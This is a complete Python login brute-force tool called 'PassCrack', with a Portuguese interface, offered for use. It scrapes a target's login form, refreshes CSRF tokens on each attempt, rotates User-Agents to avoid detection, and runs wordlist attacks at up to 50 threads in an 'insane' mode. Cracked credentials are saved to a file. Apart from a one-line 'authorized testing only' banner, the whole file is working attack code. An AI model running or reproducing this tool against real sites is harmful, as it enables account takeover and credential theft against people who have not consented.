try:
    import requests
    from bs4 import BeautifulSoup
except ImportError as _import_err:
    import sys
    sys.exit(
        f"Dependencias nao instaladas: {_import_err}.\n"
        "Use: python -m pip install -r requirements.txt"
    )

import argparse
import sys
import os
import time
import random
import signal
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import urljoin, urlparse
from itertools import cycle

# ── Cores ANSI ───────────────────────────────────────────────────────────────
class C:
    RST   = "\033[0m"
    BOLD  = "\033[1m"
    DIM   = "\033[2m"
    RED   = "\033[91m"
    GREEN = "\033[92m"
    YELLOW= "\033[93m"
    BLUE  = "\033[94m"
    PURPLE= "\033[95m"
    CYAN  = "\033[96m"
    WHITE = "\033[97m"
    BG_RED   = "\033[41m"
    BG_GREEN = "\033[42m"
    BG_BLUE  = "\033[44m"

# ── Banner ───────────────────────────────────────────────────────────────────
BANNER = rf"""
{C.CYAN}{C.BOLD}
    ____                  ______                __
   / __ \____ ___________/ ____/________ ______/ /__
  / /_/ / __ `/ ___/ ___/ /   / ___/ __ `/ ___/ //_/
 / ____/ /_/ (__  |__  ) /___/ /  / /_/ / /__/ ,<
/_/    \__,_/____/____/\____/_/   \__,_/\___/_/|_|
{C.RST}
{C.DIM}================================================================{C.RST}
{C.PURPLE}{C.BOLD}  >> Login Brute Force Tool{C.RST}
{C.YELLOW}  >> Developed by {C.RED}{C.BOLD}@blackduck{C.RST}
{C.DIM}  >> For authorized penetration testing only{C.RST}
{C.DIM}================================================================{C.RST}
"""

DUCK = rf"""
{C.YELLOW}     __
{C.YELLOW}   <(o )___{C.RST}
{C.YELLOW}    ( ._> /{C.RST}  {C.WHITE}{C.BOLD}@blackduck{C.RST} {C.DIM}| quack quack, password cracked{C.RST}
{C.YELLOW}     `---'{C.RST}
"""

SUCCESS_ART = rf"""
{C.GREEN}{C.BOLD}
  +=========================================+
  |                                         |
  |     *** SENHA ENCONTRADA! ***           |
  |                                         |
  +=========================================+{C.RST}
"""

FAIL_ART = rf"""
{C.RED}{C.BOLD}
  +=========================================+
  |                                         |
  |     Nenhuma senha encontrada.           |
  |                                         |
  +=========================================+{C.RST}
"""

# ── Velocidades ──────────────────────────────────────────────────────────────
SPEED_MODES = {
    "easy":   {"threads": 1,  "delay": 1.0,  "label": "Easy",   "desc": "1 req/s   - Stealth mode"},
    "medium": {"threads": 3,  "delay": 0.33, "label": "Medium", "desc": "3 req/s   - Balanced"},
    "hard":   {"threads": 10, "delay": 0.1,  "label": "Hard",   "desc": "10 req/s  - Aggressive"},
    "insane": {"threads": 50, "delay": 0.0,  "label": "Insane", "desc": "Unlimited - No brakes"},
}

# ── Controle de interrupcao ──────────────────────────────────────────────────
_stop = False
_lock = threading.Lock()

def _handle_sigint(sig, frame):
    global _stop
    _stop = True
    print(f"\n{C.YELLOW}[!] Interrompido pelo usuario. Finalizando...{C.RST}")

signal.signal(signal.SIGINT, _handle_sigint)

# ── User-Agents para rotacao ─────────────────────────────────────────────────
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
    "(KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 "
    "(KHTML, like Gecko) Version/17.0 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
]

# Nomes comuns de campos CSRF em formularios
CSRF_FIELD_NAMES = [
    "csrf_token", "csrfmiddlewaretoken", "_token", "authenticity_token",
    "csrf", "_csrf_token", "CSRFToken", "token", "__RequestVerificationToken",
]

# Nomes comuns de campos de usuario
USER_FIELD_NAMES = [
    "username", "user", "email", "login", "user_login", "log",
    "usr", "userid", "user_id", "nome", "usuario",
]

# Nomes comuns de campos de senha
PASS_FIELD_NAMES = [
    "password", "pass", "passwd", "pwd", "user_password", "senha",
    "secret", "user_pass",
]


# ── Animacao de loading ──────────────────────────────────────────────────────
def loading_animation(msg, duration=1.5):
    frames = ["[    ]", "[=   ]", "[==  ]", "[=== ]", "[====]", "[ ===]", "[  ==]", "[   =]"]
    end_time = time.time() + duration
    i = 0
    while time.time() < end_time:
        print(f"\r  {C.CYAN}{frames[i % len(frames)]}{C.RST} {msg}", end="", flush=True)
        time.sleep(0.1)
        i += 1
    print(f"\r  {C.GREEN}[DONE]{C.RST} {msg}")


def progress_bar(current, total, width=30):
    pct = current / total if total > 0 else 0
    filled = int(width * pct)
    bar = "█" * filled + "░" * (width - filled)
    return f"{bar} {pct*100:5.1f}%"


# ── Deteccao de formulario ───────────────────────────────────────────────────
def detect_form_fields(html, url):
    soup = BeautifulSoup(html, "html.parser")

    forms = soup.find_all("form")
    target_form = None
    for form in forms:
        if form.find("input", attrs={"type": "password"}):
            target_form = form
            break

    if not target_form and forms:
        target_form = forms[0]

    if not target_form:
        return url, None, None, {}

    action = target_form.get("action", "")
    if action and not action.startswith("http"):
        action = urljoin(url, action)
    elif not action:
        action = url

    user_field = None
    for name in USER_FIELD_NAMES:
        inp = target_form.find("input", attrs={"name": name})
        if inp:
            user_field = name
            break
    if not user_field:
        text_inputs = target_form.find_all(
            "input", attrs={"type": lambda t: t in ("text", "email", None)}
        )
        for inp in text_inputs:
            n = inp.get("name", "")
            if n and n not in CSRF_FIELD_NAMES:
                user_field = n
                break

    pass_field = None
    for name in PASS_FIELD_NAMES:
        inp = target_form.find("input", attrs={"name": name})
        if inp:
            pass_field = name
            break
    if not pass_field:
        pwd_input = target_form.find("input", attrs={"type": "password"})
        if pwd_input:
            pass_field = pwd_input.get("name", "password")

    hidden_fields = {}
    for inp in target_form.find_all("input", attrs={"type": "hidden"}):
        name = inp.get("name")
        value = inp.get("value", "")
        if name:
            hidden_fields[name] = value

    return action, user_field, pass_field, hidden_fields


def get_login_page(session, url):
    resp = session.get(url, timeout=15)
    resp.raise_for_status()
    html = resp.text
    action, user_field, pass_field, hidden = detect_form_fields(html, url)
    return html, action, user_field, pass_field, hidden


def try_login(session, action_url, user_field, pass_field, hidden_fields,
              username, password, login_page_url, fail_string, success_string):
    data = dict(hidden_fields)
    data[user_field] = username
    data[pass_field] = password

    headers = {"User-Agent": random.choice(USER_AGENTS)}

    try:
        resp = session.post(
            action_url,
            data=data,
            headers=headers,
            timeout=15,
            allow_redirects=True,
        )
    except requests.RequestException:
        return False, password

    body = resp.text
    final_url = resp.url

    if fail_string:
        if fail_string.lower() in body.lower():
            return False, password
        else:
            return True, password

    if success_string:
        if success_string.lower() in body.lower():
            return True, password
        else:
            return False, password

    login_path = urlparse(login_page_url).path
    final_path = urlparse(final_url).path
    if final_path != login_path and final_path != login_path.rstrip("/") + "/":
        return True, password

    error_indicators = [
        "invalid", "incorrect", "wrong", "failed", "error", "denied",
        "invalido", "incorreto", "incorreta", "errado", "falhou", "negado",
        "senha invalida", "usuario nao encontrado", "login failed",
        "invalid credentials", "bad credentials", "try again",
        "tente novamente", "nao autorizado", "unauthorized",
    ]
    body_lower = body.lower()
    for indicator in error_indicators:
        if indicator in body_lower:
            return False, password

    return False, password


def load_wordlist(path):
    with open(path, "r", encoding="utf-8", errors="ignore") as f:
        return [line.strip() for line in f if line.strip()]


# ── Main ─────────────────────────────────────────────────────────────────────
def main():
    # Habilitar cores no Windows
    if os.name == "nt":
        os.system("")

    print(BANNER)

    parser = argparse.ArgumentParser(
        description="PassCrack - Login Brute Force Tool by @blackduck",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=(
            "Exemplos de uso:\n"
            "  python pass_crack.py http://alvo.com/login --user admin --passfile wordlist.txt --medium\n"
            "  python pass_crack.py http://alvo.com/login --user admin --passfile wordlist.txt --insane\n"
            "  python pass_crack.py http://alvo.com/login --user admin --passfile wordlist.txt --hard --fail-string \"senha incorreta\"\n"
        ),
    )
    parser.add_argument("url", help="URL da pagina de login")
    parser.add_argument("--user", required=True, help="Usuario para testar")
    parser.add_argument("--passfile", required=True, help="Caminho para a wordlist de senhas")

    # Modos de velocidade
    speed_group = parser.add_mutually_exclusive_group()
    speed_group.add_argument("--easy", action="store_const", const="easy", dest="speed",
                             help="1 req/s - Modo stealth")
    speed_group.add_argument("--medium", action="store_const", const="medium", dest="speed",
                             help="3 req/s - Balanceado")
    speed_group.add_argument("--hard", action="store_const", const="hard", dest="speed",
                             help="10 req/s - Agressivo")
    speed_group.add_argument("--insane", action="store_const", const="insane", dest="speed",
                             help="Sem limite - Maximo possivel")

    parser.add_argument("--user-field", default=None,
                        help="Nome do campo de usuario no form (auto-detectado se omitido)")
    parser.add_argument("--pass-field", default=None,
                        help="Nome do campo de senha no form (auto-detectado se omitido)")

    parser.add_argument("--fail-string", default=None,
                        help="Texto na resposta quando login FALHA (ex: 'senha incorreta')")
    parser.add_argument("--success-string", default=None,
                        help="Texto na resposta quando login tem SUCESSO (ex: 'bem-vindo')")

    args = parser.parse_args()

    # Default speed = medium
    speed = args.speed or "medium"
    mode = SPEED_MODES[speed]
    threads = mode["threads"]
    delay = mode["delay"]

    # ── Carregar wordlist ─────────────────────────────────────────────────
    try:
        passwords = load_wordlist(args.passfile)
    except FileNotFoundError:
        print(f"  {C.RED}[ERRO]{C.RST} Arquivo nao encontrado: {args.passfile}")
        sys.exit(1)

    if not passwords:
        print(f"  {C.RED}[ERRO]{C.RST} Wordlist vazia.")
        sys.exit(1)

    # ── Info panel ────────────────────────────────────────────────────────
    print(f"  {C.CYAN}{'─' * 52}{C.RST}")
    print(f"  {C.CYAN}│{C.RST}  {C.WHITE}{C.BOLD}CONFIGURACAO DO ATAQUE{C.RST}")
    print(f"  {C.CYAN}{'─' * 52}{C.RST}")
    print(f"  {C.CYAN}│{C.RST}  {C.DIM}Alvo{C.RST}       {C.WHITE}{args.url}{C.RST}")
    print(f"  {C.CYAN}│{C.RST}  {C.DIM}Usuario{C.RST}    {C.WHITE}{args.user}{C.RST}")
    print(f"  {C.CYAN}│{C.RST}  {C.DIM}Wordlist{C.RST}   {C.WHITE}{args.passfile}{C.RST} ({C.YELLOW}{len(passwords)}{C.RST} senhas)")

    speed_color = {
        "easy": C.GREEN, "medium": C.YELLOW,
        "hard": C.RED, "insane": f"{C.RED}{C.BOLD}",
    }
    print(f"  {C.CYAN}│{C.RST}  {C.DIM}Modo{C.RST}       {speed_color[speed]}{mode['label']}{C.RST} {C.DIM}({mode['desc']}){C.RST}")
    print(f"  {C.CYAN}│{C.RST}  {C.DIM}Threads{C.RST}    {C.WHITE}{threads}{C.RST}")

    if args.fail_string:
        print(f"  {C.CYAN}│{C.RST}  {C.DIM}Fail str{C.RST}   {C.WHITE}\"{args.fail_string}\"{C.RST}")
    if args.success_string:
        print(f"  {C.CYAN}│{C.RST}  {C.DIM}Succ str{C.RST}   {C.WHITE}\"{args.success_string}\"{C.RST}")

    print(f"  {C.CYAN}{'─' * 52}{C.RST}")
    print()

    # ── Acessar pagina de login ───────────────────────────────────────────
    session = requests.Session()
    loading_animation("Acessando pagina de login...", 1.0)

    try:
        _, action_url, user_field, pass_field, hidden_fields = get_login_page(session, args.url)
    except requests.RequestException as e:
        print(f"\n  {C.RED}[ERRO]{C.RST} Nao foi possivel acessar a URL: {e}")
        sys.exit(1)

    if args.user_field:
        user_field = args.user_field
    if args.pass_field:
        pass_field = args.pass_field

    if not user_field:
        print(f"\n  {C.RED}[ERRO]{C.RST} Campo de usuario nao detectado. Use --user-field")
        sys.exit(1)
    if not pass_field:
        print(f"\n  {C.RED}[ERRO]{C.RST} Campo de senha nao detectado. Use --pass-field")
        sys.exit(1)

    loading_animation("Analisando formulario...", 0.8)

    print(f"\n  {C.GREEN}│{C.RST} Form action: {C.WHITE}{action_url}{C.RST}")
    print(f"  {C.GREEN}│{C.RST} Campo user:  {C.WHITE}{user_field}{C.RST}")
    print(f"  {C.GREEN}│{C.RST} Campo pass:  {C.WHITE}{pass_field}{C.RST}")
    if hidden_fields:
        print(f"  {C.GREEN}│{C.RST} Hidden:      {C.WHITE}{', '.join(hidden_fields.keys())}{C.RST}")

    print()
    loading_animation("Preparando ataque...", 0.6)
    print()
    print(f"  {C.PURPLE}{C.BOLD}>> BRUTE FORCE INICIADO{C.RST}")
    print(f"  {C.DIM}{'━' * 52}{C.RST}")

    # ── Brute force ───────────────────────────────────────────────────────
    found = False
    found_password = None
    total = len(passwords)
    tested = 0
    start_time = time.time()
    spinner = cycle(["⠋", "⠙", "⠹", "⠸", "⠼", "⠴", "⠦", "⠧", "⠇", "⠏"])

    def attempt(pwd):
        if _stop:
            return False, pwd
        s = requests.Session()
        try:
            _, _, _, _, current_hidden = get_login_page(s, args.url)
        except requests.RequestException:
            current_hidden = dict(hidden_fields)

        if delay > 0:
            time.sleep(delay)

        return try_login(
            s, action_url, user_field, pass_field, current_hidden,
            args.user, pwd, args.url, args.fail_string, args.success_string,
        )

    with ThreadPoolExecutor(max_workers=threads) as executor:
        futures = {}
        for pwd in passwords:
            if _stop:
                break
            f = executor.submit(attempt, pwd)
            futures[f] = pwd

        for future in as_completed(futures):
            if _stop:
                break
            tested += 1
            success, pwd = future.result()
            elapsed = time.time() - start_time
            rate = tested / elapsed if elapsed > 0 else 0

            if success:
                found = True
                found_password = pwd
                _handle_sigint(None, None)
                break
            else:
                bar = progress_bar(tested, total)
                spin = next(spinner)
                trunc_pwd = pwd[:20].ljust(20)
                print(
                    f"\r  {C.CYAN}{spin}{C.RST} "
                    f"{C.DIM}{bar}{C.RST} "
                    f"{C.RED}FAIL{C.RST} {C.WHITE}{trunc_pwd}{C.RST} "
                    f"{C.DIM}[{tested}/{total}] {rate:.0f}r/s{C.RST}",
                    end="", flush=True,
                )

    # ── Limpar linha e resultado ──────────────────────────────────────────
    print("\r" + " " * 80 + "\r", end="")
    elapsed = time.time() - start_time

    print(f"  {C.DIM}{'━' * 52}{C.RST}")

    if found:
        print(SUCCESS_ART)
        print(f"  {C.GREEN}{C.BOLD}Usuario:{C.RST}    {C.WHITE}{args.user}{C.RST}")
        print(f"  {C.GREEN}{C.BOLD}Senha:{C.RST}      {C.WHITE}{C.BOLD}{found_password}{C.RST}")
        print(f"  {C.DIM}Tentativas: {tested}/{total}{C.RST}")
        print(f"  {C.DIM}Tempo:      {elapsed:.1f}s{C.RST}")
        print()

        with open("result.txt", "w", encoding="utf-8") as f:
            f.write(f"URL: {args.url}\n")
            f.write(f"Usuario: {args.user}\n")
            f.write(f"Senha: {found_password}\n")
            f.write(f"Tempo: {elapsed:.1f}s\n")
            f.write(f"Tentativas: {tested}/{total}\n")

        print(f"  {C.GREEN}[+]{C.RST} Resultado salvo em {C.WHITE}result.txt{C.RST}")
    else:
        print(FAIL_ART)
        print(f"  {C.DIM}Tentativas: {tested}/{total}{C.RST}")
        print(f"  {C.DIM}Tempo:      {elapsed:.1f}s{C.RST}")

    print(DUCK)


if __name__ == "__main__":
    main()
